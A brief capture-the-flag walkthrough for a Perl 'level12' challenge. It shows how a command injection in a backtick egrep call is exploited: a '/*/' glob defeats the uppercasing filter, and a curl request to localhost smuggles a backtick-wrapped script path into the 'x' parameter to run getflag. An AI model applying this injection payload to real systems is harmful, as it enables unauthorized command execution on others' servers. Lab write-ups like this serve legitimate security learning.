1. cat level12.pl
We notice that there is a shell command executed via:
@output = `egrep "^$xx" /tmp/xd 2>&1`

So if we manage to make the program execute a script via $xx, we can make it!

2. We notice that the x parameter, recovered via the $xx variable, is firts capitalize, and then its spaces are withdrawn.
Hence if we pass to it  /tmp/SCRIPT for exec, it would transform the path into /TMP/SCRIPT and in the egrep command, it won't find it.

3. we can use the * shell operator so that it will find /*/SCRIPT!

4. Hence we build the following script: vim /tmp/SCRIPT 
getflag > /tmp/flag    +   change permissions

5. With curl, we send a http request to the port 4646 of our VM with the x parameter as the execution of the script:
curl http://localhost:4646/?x="\`/*/SCRIPT\`"

6. then cat /tmp/flag => we get the flag!
